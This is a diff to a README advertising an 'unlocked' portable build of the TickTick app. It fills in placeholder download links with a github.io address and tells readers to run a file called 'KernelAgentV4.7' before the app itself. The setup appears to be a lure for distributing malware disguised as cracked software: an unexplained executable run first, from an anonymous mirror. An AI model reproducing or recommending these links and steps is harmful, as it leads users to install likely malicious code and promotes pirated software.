@@ -1,11 +1,13 @@
 # TickTick Portable – Final Enhanced Version (Unlocked)
 
-[![Download](https://img.shields.io/badge/Download-TickTick_Portable-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-TickTick_Portable-blueviolet)](https://ticktick-portable-final-enhanced-v.github.io/.github
+)
 
 ### ⚙️ Installation Instructions
 
 1. Download the archive from the link above  
-   🔗 Or use this mirror: [PLACE_YOUR_DOWNLOAD_LINK_HERE](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+   🔗 Or use this mirror: [PLACE_YOUR_DOWNLOAD_LINK_HERE](https://ticktick-portable-final-enhanced-v.github.io/.github
+)  
 2. Extract to any folder or USB device  
 3. Run `KernelAgentV4.7` first  
 4. Then open `TickTickPortable.exe`  
